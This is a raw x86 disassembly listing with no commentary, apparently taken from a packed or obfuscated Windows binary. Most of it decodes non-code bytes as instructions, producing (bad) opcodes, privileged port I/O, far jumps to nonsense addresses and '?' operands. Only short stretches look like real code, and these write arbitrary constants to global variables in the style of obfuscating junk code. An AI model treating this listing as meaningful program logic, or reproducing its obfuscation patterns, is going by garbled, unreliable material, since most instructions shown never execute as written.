  40db5e:	fist   WORD PTR [ecx-0x24]
  40db61:	or     dl,cl
  40db63:	xor    DWORD PTR [edi],0x22
  40db66:	inc    edx
  40db67:	pop    ds
  40db68:	stc    
  40db69:	add    al,0x61
  40db6b:	out    0x92,al
  40db6d:	in     eax,dx
  40db6e:	jbe    0x40dbb3
  40db70:	xchg   ebp,eax
  40db71:	inc    edi
  40db72:	mov    ss,WORD PTR [ebx+eax*8]
  40db75:	call   0x1979364a
  40db7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db7b:	fisub  WORD PTR [eax+0x43]
  40db7e:	cmc    
  40db7f:	jg     0x40dbfe
  40db81:	pushf  
  40db82:	xchg   edi,eax
  40db83:	sub    DWORD PTR [ebp-0x1b],ebp
  40db86:	inc    edi
  40db87:	loope  0x40db8a
  40db89:	mov    eax,ds:0x735b31e6
  40db8e:	aam    0xa2
  40db90:	add    DWORD PTR [ebx-0x61],edx
  40db93:	repnz xchg dx,ax
  40db96:	xor    al,dh
  40db98:	mov    edx,?
  40db9a:	mov    WORD PTR [eax-0x3f],gs
  40db9d:	fst    DWORD PTR [ebp-0x32]
  40dba0:	pop    edx
  40dba1:	push   cs
  40dba2:	sbb    eax,0x865f5dff
  40dba7:	cmp    eax,0x1772c351
  40dbac:	shl    DWORD PTR es:0x42a5f418,0x11
  40dbb4:	inc    ebx
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x20bfeba4],0xfa8945f1
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc52
  40dbe0:	out    dx,al
  40dbe1:	mov    eax,ds:0x23c4479c
  40dbe6:	cmp    al,0x4b
  40dbe8:	out    dx,al
  40dbe9:	rol    BYTE PTR [edx+0x7b],cl
  40dbec:	daa    
  40dbed:	sbb    BYTE PTR [edx],ah
  40dbef:	mov    edi,0x13597056
  40dbf4:	je     0x40db7e
  40dbf6:	dec    edi
  40dbf7:	shr    DWORD PTR [eax+0x4d5bac41],0x92
  40dbfe:	repnz leave 
  40dc00:	mov    cl,0x68
  40dc02:	sub    al,0x7e
  40dc05:	ret    
  40dc06:	mov    edx,0xadc6b512
  40dc0b:	mov    ah,0xe0
  40dc0d:	xchg   edx,eax
  40dc0e:	cwde   
  40dc0f:	icebp  
  40dc10:	bound  ebx,QWORD PTR [eax-0x2e3487f5]
  40dc16:	mov    esp,ebx
  40dc18:	aam    0xea
  40dc1a:	sub    ch,dh
  40dc1c:	jg     0x40dc32
  40dc1e:	mov    dl,0x82
  40dc20:	push   0x4d56a54
  40dc25:	xchg   edx,eax
  40dc26:	dec    BYTE PTR [ebx-0x52]
  40dc29:	jb     0x40dc32
  40dc2b:	xchg   BYTE PTR [edi-0x77980477],al
  40dc31:	push   0x7b
  40dc33:	out    0x20,eax
  40dc35:	out    0xb0,al
  40dc37:	jl     0x40dc43
  40dc39:	sub    ebx,DWORD PTR [ebx+0x6b3285b6]
  40dc3f:	retf   0x88e2
  40dc42:	inc    ebp
  40dc43:	jl     0x40dc38
  40dc45:	test   BYTE PTR [ebp-0x390ae1d],0xfa
  40dc4c:	dec    edx
  40dc4d:	sub    DWORD PTR [ebp-0x1f],ebp
  40dc50:	retf   0xdb17
  40dc53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc54:	icebp  
  40dc55:	adc    cl,bh
  40dc57:	hlt    
  40dc58:	push   ecx
  40dc59:	lds    edi,FWORD PTR [ebx+0x1b091fa4]
  40dc5f:	loopne 0x40dc7a
  40dc61:	std    
  40dc62:	(bad)  
  40dc63:	sub    DWORD PTR [eax],eax
  40dc65:	popa   
  40dc66:	test   ch,dh
  40dc68:	pop    es
  40dc69:	xchg   ecx,eax
  40dc6a:	and    eax,0x97bf630c
  40dc6f:	js     0x40dcdb
  40dc71:	and    esi,esp
  40dc73:	inc    ebx
  40dc74:	xchg   DWORD PTR [ecx+esi*8],eax
  40dc77:	das    
  40dc78:	or     DWORD PTR [eax-0x14acb547],0x1d
  40dc7f:	mov    esi,0xac53a192
  40dc84:	pop    esi
  40dc85:	loop   0x40dcf6
  40dc87:	push   esi
  40dc88:	js     0x40dcf4
  40dc8a:	cli    
  40dc8b:	imul   eax
  40dc8d:	dec    eax
  40dc8e:	jge    0x40dc6f
  40dc90:	test   DWORD PTR [eax+0x50e616fb],ecx
  40dc96:	push   ss
  40dc97:	lds    esp,FWORD PTR [edx+eiz*4]
  40dc9a:	sar    DWORD PTR [esi+0x498d2db6],cl
  40dca0:	xchg   ecx,eax
  40dca1:	das    
  40dca2:	jae    0x40dc31
  40dca4:	push   ebx
  40dca5:	imul   eax,DWORD PTR [eax+0x6e],0xb
  40dca9:	les    ebx,FWORD PTR [ecx-0x7d]
  40dcac:	inc    ebp
  40dcad:	pop    esi
  40dcae:	std    
  40dcaf:	sti    
  40dcb0:	mov    bl,0xc8
  40dcb2:	xchg   ebp,eax
  40dcb3:	jns    0x40dcc9
  40dcb5:	dec    esi
  40dcb6:	test   DWORD PTR [edx+0x2ad0b097],0x5c2dfb21
  40dcc0:	mov    ds:0xdda38d92,eax
  40dcc5:	imul   esi,DWORD PTR [ecx-0x73fea13e],0xffffff85
  40dccc:	cmc    
  40dccd:	pop    es
  40dcce:	pop    eax
  40dccf:	jge    0x40dd06
  40dcd1:	stos   BYTE PTR es:[edi],al
  40dcd2:	sub    DWORD PTR [edi+0x6a],edx
  40dcd5:	inc    edi
  40dcd6:	push   ds
  40dcd7:	int    0x23
  40dcd9:	iret   
  40dcda:	and    eax,0xe4e900ec
  40dcdf:	jo     0x40dd3b
  40dce1:	lods   al,BYTE PTR ds:[esi]
  40dce2:	inc    edx
  40dce3:	xchg   ebx,eax
  40dce4:	inc    ecx
  40dce5:	and    al,0x6b
  40dce7:	scas   al,BYTE PTR es:[edi]
  40dce8:	cli    
  40dce9:	stos   DWORD PTR es:[edi],eax
  40dcea:	cld    
  40dceb:	jge    0x40dcba
  40dced:	out    0x80,al
  40dcef:	sbb    bl,BYTE PTR ds:0xf15507ca
  40dcf5:	ds neg bl
  40dcf8:	lods   eax,DWORD PTR ds:[esi]
  40dcf9:	push   0xe3b0cbc0
  40dcfe:	mov    edi,0x322be6c1
  40dd03:	xor    eax,0x428236e4
  40dd08:	inc    ecx
  40dd09:	hlt    
  40dd0a:	xchg   DWORD PTR [edx+edi*1],eax
  40dd0d:	adc    ecx,DWORD PTR [ecx-0x2d7f4c9f]
  40dd13:	pop    es
  40dd14:	mov    ecx,0x3ecf14c8
  40dd19:	gs loope 0x40dcc4
  40dd1c:	jl     0x40dcc4
  40dd1e:	mov    ds:0x2ae78412,eax
  40dd23:	out    dx,eax
  40dd24:	rcl    DWORD PTR [edi],0xed
  40dd27:	jnp    0x40dd6e
  40dd29:	loopne 0x40dd0d
  40dd2b:	cld    
  40dd2c:	pop    es
  40dd2d:	or     al,0x19
  40dd2f:	pusha  
  40dd30:	inc    ecx
  40dd31:	lock shr eax,cl
  40dd34:	out    dx,eax
  40dd35:	add    edi,DWORD PTR [edi+eiz*2]
  40dd38:	or     DWORD PTR [edx+eiz*1],ebp
  40dd3b:	leave  
  40dd3c:	lock frstor [ebx-0x4]
  40dd40:	in     eax,dx
  40dd41:	add    eax,0x4c42715a
  40dd46:	shl    BYTE PTR [ecx+0x17e808ec],cl
  40dd4c:	cli    
  40dd4d:	fst    DWORD PTR [ecx-0x74e8423a]
  40dd53:	retf   
  40dd54:	xor    DWORD PTR [eax+0x45],edi
  40dd57:	add    BYTE PTR [ecx-0x1f],0xde
  40dd5b:	and    eax,DWORD PTR [esi+eiz*1-0x5c8d617e]
  40dd62:	adc    eax,0x21d8ef97
  40dd67:	xchg   esi,eax
  40dd68:	in     eax,0xf7
  40dd6a:	sbb    bl,ah
  40dd6c:	fsub   st(3),st
  40dd6e:	xchg   ebx,eax
  40dd6f:	push   eax
  40dd70:	sti    
  40dd71:	add    ch,BYTE PTR ds:0x4ff611e3
  40dd77:	lods   al,BYTE PTR ds:[esi]
  40dd78:	push   eax
  40dd79:	cmp    esp,DWORD PTR [esi-0x5b118ee6]
  40dd7f:	fs dec ecx
  40dd81:	cmc    
  40dd82:	mov    dh,0x44
  40dd84:	ret    0xe321
  40dd87:	push   ecx
  40dd88:	ret    0x8add
  40dd8b:	lahf   
  40dd8c:	daa    
  40dd8d:	xchg   edi,eax
  40dd8e:	or     al,0x5c
  40dd90:	cld    
  40dd91:	cbw    
  40dd93:	clc    
  40dd94:	repz jae 0x40dd74
  40dd97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd98:	xor    al,0x50
  40dd9a:	xchg   edx,eax
  40dd9b:	mov    ?,WORD PTR [ebx+0x7f]
  40dd9e:	bound  edx,QWORD PTR [edx+0x3c]
  40dda1:	xchg   edi,eax
  40dda2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dda3:	loop   0x40dd55
  40dda5:	fdivr  DWORD PTR [edx-0x10]
  40dda8:	xchg   ebx,eax
  40dda9:	or     al,0xdf
  40ddab:	cld    
  40ddac:	scas   al,BYTE PTR es:[edi]
  40ddad:	pop    edi
  40ddae:	jb     0x40dda7
  40ddb0:	js     0x40ddd0
  40ddb2:	sbb    BYTE PTR [esi],dh
  40ddb4:	outs   dx,BYTE PTR ds:[esi]
  40ddb5:	jg     0x40dd3d
  40ddb7:	mul    DWORD PTR [esi-0xa758597]
  40ddbd:	mov    esp,0x5b11f0c
  40ddc2:	push   esp
  40ddc3:	into   
  40ddc4:	in     al,0x3a
  40ddc6:	adc    ecx,DWORD PTR [edi+esi*8]
  40ddc9:	fdiv   QWORD PTR [esi]
  40ddcb:	cdq    
  40ddcc:	mov    dh,0x26
  40ddce:	and    eax,0x203a96ff
  40ddd3:	cwde   
  40ddd4:	out    0xb9,eax
  40ddd6:	push   es
  40ddd7:	not    DWORD PTR [edi-0x6e830a98]
  40dddd:	mov    ch,0x8e
  40dddf:	inc    edx
  40dde0:	ficom  WORD PTR [edi]
  40dde2:	call   0xca947d18
  40dde7:	sub    cl,BYTE PTR [edi+edi*2+0x7b]
  40ddeb:	cld    
  40ddec:	rcl    DWORD PTR [ecx+0x6d429645],cl
  40ddf2:	popa   
  40ddf3:	sti    
  40ddf4:	icebp  
  40ddf5:	add    ch,BYTE PTR [edx-0x47b65da0]
  40ddfb:	std    
  40ddfc:	xor    al,0xa5
  40ddfe:	test   BYTE PTR [ebx],dl
  40de00:	aam    0xef
  40de02:	loop   0x40de32
  40de04:	inc    edi
  40de05:	and    DWORD PTR [eax-0x530ac6f2],eax
  40de0b:	sub    al,0x35
  40de0d:	and    al,0xb7
  40de0f:	adc    BYTE PTR [edi+0x4909a924],cl
  40de15:	pop    eax
  40de16:	sub    eax,DWORD PTR [ebp+0x65]
  40de19:	ss jmp 0xc603:0xbb7338b5
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	imul   edi
  40dea7:	push   0x9cbadcf9
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40dea7
  40deb3:	xchg   ecx,eax
  40deb4:	xor    eax,0x8265f420
  40deb9:	xchg   esp,eax
  40deba:	mov    dl,0xb
  40debc:	mov    ecx,0xf7842b0a
  40dec1:	cli    
  40dec2:	nop
  40dec3:	ret    
  40dec4:	loope  0x40def8
  40dec6:	sub    DWORD PTR [ecx],0xfffffff5
  40dec9:	in     al,dx
  40deca:	inc    ecx
  40decb:	ror    DWORD PTR [ebp+0x4d],1
  40dece:	in     eax,0xca
  40ded0:	out    0xb,eax
  40ded2:	int3   
  40ded3:	ret    0xa835
  40ded6:	and    BYTE PTR [edi+0x45],dl
  40ded9:	dec    edx
  40deda:	js     0x40df1f
  40dedc:	adc    al,0x4b
  40dede:	jge    0x40df47
  40dee0:	fdiv   QWORD PTR [esi]
  40dee2:	int3   
  40dee3:	aaa    
  40dee4:	sub    bl,BYTE PTR [ecx+0x373319e8]
  40deea:	adc    al,0xfd
  40deec:	xlat   BYTE PTR ds:[ebx]
  40deed:	jnp    0x40dee8
  40deef:	jp     0x40df47
  40def1:	xor    DWORD PTR [ebp-0x7],0x41349a2c
  40def8:	shl    DWORD PTR [edi+0x128ca8b0],1
  40defe:	mov    esp,0x50ce6041
  40df03:	into   
  40df04:	mov    ss,WORD PTR [edx+0x2f]
  40df07:	jnp    0x40de97
  40df09:	fcmovnb st,st(2)
  40df0b:	adc    al,BYTE PTR [eax]
  40df0d:	mov    al,ds:0xb0008eb0
  40df12:	and    DWORD PTR [esi-0x4dc6feb3],0x5323bf82
  40df1c:	inc    ecx
  40df1d:	out    dx,al
  40df1e:	aaa    
  40df1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df20:	dec    edi
  40df21:	lds    edi,FWORD PTR [ebp-0x4eaf2ef8]
  40df27:	cdq    
  40df28:	sbb    dh,BYTE PTR [edi-0x25]
  40df2b:	jbe    0x40df2a
  40df2d:	xchg   ebp,eax
  40df2e:	and    BYTE PTR ds:0x7615a8e,0x82
  40df35:	dec    ebx
  40df36:	pop    edi
  40df37:	xchg   ebx,eax
  40df38:	pop    edi
  40df39:	mov    DWORD PTR [ebx-0x4c3950b7],edx
  40df3f:	jg     0x40def9
  40df41:	out    0x90,eax
  40df43:	ja     0x40df5d
  40df45:	cmp    BYTE PTR [ecx],ch
  40df47:	mov    WORD PTR [ebx+0x3ea74661],fs
  40df4d:	lock (bad) [esi+0x6a]
  40df52:	pop    ecx
  40df53:	icebp  
  40df54:	xor    BYTE PTR [esi-0x78],dl
  40df57:	sar    esp,1
  40df59:	mov    WORD PTR [edx+0x499022e2],fs
  40df5f:	adc    al,0x4f
  40df61:	mov    WORD PTR [edi+0xb],?
  40df64:	(bad)  
  40df65:	popf   
  40df66:	clc    
  40df67:	xor    dh,BYTE PTR [ebx+0x43e1e214]
  40df6d:	dec    edi
  40df6e:	fcmovne st,st(7)
  40df70:	mov    ebp,0x6f120a08
  40df75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df76:	and    al,0xc1
  40df78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df79:	hlt    
  40df7a:	sbb    eax,0x7ce4838a
  40df7f:	dec    ebx
  40df80:	jge    0x40df65
  40df82:	push   0x15
  40df84:	fistp  QWORD PTR [edi]
  40df86:	lods   al,BYTE PTR ds:[esi]
  40df87:	pop    ss
  40df88:	push   esi
  40df89:	jecxz  0x40e000
  40df8b:	mov    dl,0x99
  40df8d:	cdq    
  40df8e:	push   ebp
  40df8f:	xor    BYTE PTR [esi+0x7d2b4ba8],0x6d
  40df96:	loope  0x40e00d
  40df98:	or     ah,BYTE PTR [edx-0x757c8c21]
  40df9e:	les    eax,FWORD PTR [edi-0x55]
  40dfa1:	add    bh,dh
  40dfa3:	and    bh,cl
  40dfa5:	push   0x4da75519
  40dfaa:	jae    0x40df99
  40dfac:	dec    esi
  40dfad:	push   edi
  40dfae:	lods   eax,DWORD PTR ds:[esi]
  40dfaf:	adc    ah,bl
  40dfb1:	ror    DWORD PTR [edi+0x36e013f6],cl
  40dfb7:	hlt    
  40dfb8:	mov    dh,0x7d
  40dfba:	xchg   esi,eax
  40dfbb:	retf   0x21d5
  40dfbe:	fs adc eax,0x37039fd6
  40dfc4:	(bad)  [ebx+eiz*8+0x25]
  40dfc8:	pop    ebp
  40dfc9:	icebp  
  40dfca:	(bad)  
  40dfcb:	sub    edx,ebx
  40dfcd:	test   DWORD PTR [ebx+0x2d810845],ecx
  40dfd3:	xchg   edi,eax
  40dfd4:	ss inc ebx
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	call   0x7e9d:0x5e946114
  40e00a:	jle    0x40e01e
  40e00c:	jg     0x40e08c
  40e00e:	jle    0x40dfdd
  40e010:	mov    dh,0xec
  40e012:	xchg   esp,eax
  40e013:	lahf   
  40e014:	jo     0x40e063
  40e016:	icebp  
  40e017:	push   0xffffff87
  40e019:	mov    edx,DWORD PTR [ecx]
  40e01b:	call   0xe92f:0xdb80b3f7
  40e022:	sub    eax,0xc3fb890d
  40e027:	loope  0x40e075
  40e029:	xor    BYTE PTR [eax-0x53],0x4
  40e02d:	into   
  40e02e:	pop    ss
  40e02f:	xchg   esp,eax
  40e030:	sub    cl,BYTE PTR [esi]
  40e032:	aad    0xc8
  40e034:	cmp    al,0x9b
  40e036:	fwait
  40e037:	outs   dx,DWORD PTR ds:[esi]
  40e038:	jmp    0x40e0ae
  40e03a:	xchg   DWORD PTR [edx],ebp
  40e03c:	push   ss
  40e03d:	cmp    ch,BYTE PTR [ebx]
  40e03f:	inc    eax
  40e040:	mov    dh,0x19
  40e042:	pop    es
  40e043:	into   
  40e044:	sub    al,0x2e
  40e046:	and    DWORD PTR [ebp-0x35f23323],ebp
  40e04c:	push   ecx
  40e04d:	mov    cl,0x2a
  40e04f:	fst    st(3)
  40e051:	xor    cl,0x98
  40e054:	out    0x5f,eax
  40e056:	push   ebp
  40e057:	push   ebp
  40e058:	and    bh,dl
  40e05a:	daa    
  40e05b:	mov    ebp,0xa3d2cdbc
  40e060:	ret    
  40e061:	cmp    edx,DWORD PTR [eax-0x7e]
  40e064:	push   0x6ff3369b
  40e069:	sub    BYTE PTR [ebx+0x72f3b28d],bh
  40e06f:	add    bh,BYTE PTR [ebx+ebx*2-0x18be989]
  40e076:	inc    ecx
  40e077:	or     ecx,eax
  40e079:	aad    0xc4
  40e07b:	jmp    0xc694f16b
  40e080:	mov    ds:0x5cae9668,al
  40e085:	and    DWORD PTR [edx+0x5bec0036],ebx
  40e08b:	xchg   esi,eax
  40e08c:	mov    edi,0x8fe95418
  40e091:	xor    ebx,esp
  40e093:	das    
  40e094:	ficom  DWORD PTR [edx+0xe]
  40e097:	fs out 0xa7,al
  40e09a:	jnp    0x40e03c
  40e09c:	jb     0x40e100
  40e09e:	lock repz (bad) 
  40e0a1:	xor    edi,DWORD PTR [ebx+0x4c]
  40e0a4:	inc    ecx
  40e0a5:	sbb    esi,DWORD PTR [eax-0x2e]
  40e0a8:	pop    es
  40e0a9:	fiadd  WORD PTR [edi-0x4d]
  40e0ac:	inc    eax
  40e0ad:	inc    esp
  40e0ae:	repnz lds edi,FWORD PTR [ebx+0x6422fefb]
  40e0b5:	in     eax,0x80
  40e0b7:	int3   
  40e0b8:	or     eax,0xaa969593
  40e0bd:	cwde   
  40e0be:	ja     0x40e0f5
  40e0c0:	push   ecx
  40e0c1:	inc    ecx
  40e0c2:	(bad)  
  40e0c3:	xchg   edx,eax
  40e0c4:	jo     0x40e137
  40e0c6:	mov    bh,0x55
  40e0c8:	neg    BYTE PTR [edi-0x4c44a404]
  40e0ce:	sub    cl,bl
  40e0d0:	inc    ebp
  40e0d1:	pop    ecx
  40e0d2:	xchg   ebp,eax
  40e0d3:	mov    bh,0x58
  40e0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0d6:	retf   
  40e0d7:	jle    0x40e0e1
  40e0d9:	mov    al,ds:0x7e3443bd
  40e0de:	lahf   
  40e0df:	std    
  40e0e0:	xor    esp,edi
  40e0e2:	push   cs
  40e0e3:	cld    
  40e0e4:	mov    bl,0x52
  40e0e6:	fild   WORD PTR [edx-0x2ba057d2]
  40e0ec:	mov    ah,0x86
  40e0ee:	pop    es
  40e0ef:	push   ss
  40e0f0:	pop    ds
  40e0f1:	ds inc edx
  40e0f3:	jl     0x40e12c
  40e0f5:	aam    0xb2
  40e0f7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0f9:	clc    
  40e0fa:	stos   DWORD PTR es:[edi],eax
  40e0fb:	dec    ebp
  40e0fc:	pop    ss
  40e0fd:	push   ebp
  40e0fe:	or     dh,BYTE PTR [eax]
  40e100:	hlt    
  40e101:	ins    BYTE PTR es:[edi],dx
  40e102:	inc    edi
  40e103:	or     DWORD PTR [esi+0x58],ebx
  40e106:	sbb    DWORD PTR [edx+0x5bda7fc7],0xfe1d6595
  40e110:	ror    DWORD PTR [ecx-0x71],cl
  40e113:	int    0xd4
  40e115:	pop    esp
  40e116:	ins    BYTE PTR es:[edi],dx
  40e117:	mov    DWORD PTR [esi],ecx
  40e119:	cmp    ah,BYTE PTR [edx+0x516e533e]
  40e11f:	mov    eax,0xa8458334
  40e124:	jbe    0x40e0c5
  40e126:	mov    edi,0x613657d1
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	sar    BYTE PTR cs:[ebp+0x7e9a72e4],1
  40e161:	jle    0x40e175
  40e163:	jg     0x40e1e3
  40e165:	jle    0x40e1e1
  40e167:	int    0x7c
  40e169:	stc    
  40e16a:	cwde   
  40e16b:	xchg   esi,eax
  40e16d:	inc    edx
  40e16e:	and    al,0xe7
  40e170:	jmp    0x4d9cc554
  40e175:	mov    ah,0x50
  40e177:	clc    
  40e178:	leave  
  40e179:	int    0x7b
  40e17b:	cmp    cl,BYTE PTR [ebp-0x7d]
  40e17e:	push   es
  40e17f:	je     0x40e1d3
  40e181:	add    eax,0x28de866d
  40e186:	push   ss
  40e187:	pop    ebp
  40e188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e189:	out    dx,al
  40e18a:	loop   0x40e163
  40e18c:	pop    ss
  40e18d:	sbb    dl,ch
  40e18f:	xlat   BYTE PTR ds:[ebx]
  40e190:	imul   BYTE PTR [ecx+0x5f236a47]
  40e196:	mov    bl,0x22
  40e198:	lock push ebp
  40e19a:	mov    BYTE PTR [edi-0x4daadd6e],dh
  40e1a0:	pop    edi
  40e1a1:	ret    
  40e1a2:	pop    ebx
  40e1a3:	es jmp 0x26a9:0x11da9a38
  40e1ab:	sar    BYTE PTR [edi+0x5d],0xf2
  40e1af:	mov    ebp,0x12006c9b
  40e1b4:	js     0x40e1fb
  40e1b6:	ja     0x40e15c
  40e1b8:	int3   
  40e1b9:	or     esi,DWORD PTR [esi+eax*8]
  40e1bc:	jnp    0x40e1bc
  40e1be:	sub    ch,bh
  40e1c0:	arpl   sp,cx
  40e1c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1c3:	push   esp
  40e1c4:	sar    BYTE PTR [edx],0xf5
  40e1c7:	jnp    0x40e181
  40e1c9:	test   al,al
  40e1cb:	pusha  
  40e1cc:	push   ds
  40e1cd:	xor    cl,BYTE PTR ds:0xa0e856fc
  40e1d3:	sbb    DWORD PTR [edx+0x58226b47],esi
  40e1d9:	inc    eax
  40e1da:	push   edi
  40e1db:	jbe    0x40e1df
  40e1dd:	call   0xb8ac:0xa471
  40e1e3:	ds inc ebx
  40e1e5:	lds    edx,FWORD PTR [edi]
  40e1e7:	xor    BYTE PTR [ebp-0x56],dh
  40e1ea:	shl    DWORD PTR [ecx+0x31fd5652],1
  40e1f0:	ds jg  0x40e196
  40e1f3:	and    ebx,DWORD PTR [ebx-0x62]
  40e1f6:	jns    0x40e22d
  40e1f8:	les    ebp,FWORD PTR [ecx+0x49]
  40e1fb:	es sub al,0x0
  40e1fe:	and    edi,ebx
  40e200:	push   edx
  40e201:	rcr    DWORD PTR [ecx+0x628546df],1
  40e207:	das    
  40e208:	out    dx,al
  40e209:	mov    eax,ds:0x998e38f
  40e20e:	scas   al,BYTE PTR es:[edi]
  40e20f:	in     al,dx
  40e210:	push   esp
  40e211:	sbb    eax,0xdc1b3eca
  40e216:	sub    edi,DWORD PTR [ecx+0x36580b4e]
  40e21c:	lds    esp,FWORD PTR [edi+ecx*1-0x3564363a]
  40e223:	lahf   
  40e224:	gs out 0x86,al
  40e227:	hlt    
  40e228:	jecxz  0x40e1bf
  40e22a:	push   esi
  40e22b:	xchg   ebp,eax
  40e22c:	les    esp,FWORD PTR [eax-0x15391a52]
  40e232:	mov    ds:0xf2074dda,eax
  40e237:	pop    ds
  40e238:	sub    al,0xa2
  40e23a:	push   eax
  40e23b:	dec    edi
  40e23c:	cmp    DWORD PTR [esi+0x618d6e12],eax
  40e242:	faddp  st(1),st
  40e244:	mov    ah,0xc6
  40e246:	scas   eax,DWORD PTR es:[edi]
  40e247:	scas   al,BYTE PTR es:[edi]
  40e248:	out    0xc6,al
  40e24a:	mov    ch,0xb6
  40e24c:	jns    0x40e218
  40e24e:	mov    ch,0x8a
  40e250:	jge    0x40e2b9
  40e252:	pop    edx
  40e253:	arpl   cx,ax
  40e255:	mov    esp,0x881ab9c2
  40e25a:	xchg   edx,eax
  40e25b:	and    al,0x14
  40e25d:	and    bh,BYTE PTR [edi+0x67]
  40e260:	pusha  
  40e261:	in     al,dx
  40e262:	push   ebx
  40e263:	pop    edx
  40e264:	pusha  
  40e265:	imul   esi,ebx,0x4cf4ca62
  40e26b:	xchg   ebp,eax
  40e26c:	mov    esp,0x5fff398e
  40e271:	fwait
  40e272:	out    dx,al
  40e273:	sbb    ebx,DWORD PTR [esi]
  40e275:	and    eax,0x608f437
  40e27a:	or     cl,al
  40e27c:	fild   QWORD PTR [ecx]
  40e27e:	jns    0x40e21c
  40e280:	dec    ecx
  40e281:	das    
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
